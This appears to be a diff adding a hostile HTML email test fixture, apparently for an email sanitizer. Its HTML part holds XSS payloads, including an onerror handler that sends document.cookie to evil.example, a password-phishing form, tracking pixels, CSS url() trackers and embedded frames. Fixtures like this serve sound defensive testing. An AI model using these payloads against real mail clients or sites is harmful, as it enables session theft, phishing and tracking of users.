@@ -1,0 +1,30 @@
+X-Fixture-Purpose: hostile HTML: script, event handlers, remote/tracking images, form, iframe, style element, css url()
+From: Mallory <mallory@evil.example>
+To: Acme Support <support@acme.example>
+Subject: Please review
+Date: Tue, 22 Sep 2026 10:15:00 +0000
+Message-ID: <hostile-0001@mail.customer.example>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt-h"
+
+--alt-h
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+Hello
+
+--alt-h
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><head><style>body{background:url(https://tracker.evil.example/bg.png)}</style><script>alert(document.cookie)</script></head><body onload="steal()">
+<p style="background-image:url(https://tracker.evil.example/p.gif)">Hello</p>
+<img src="x" onerror="fetch('https://evil.example/?c='+document.cookie)">
+<img src="https://tracker.evil.example/pixel.gif" width="1" height="1">
+<a href="javascript:alert(1)">click</a> <a href="https://docs.example/help">help</a>
+<form action="https://evil.example/phish" method="post"><input name="password" type="password"><button>Login</button></form>
+<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object>
+<svg onload="alert(2)"><script>alert(3)</script></svg>
+</body></html>
+
+--alt-h--
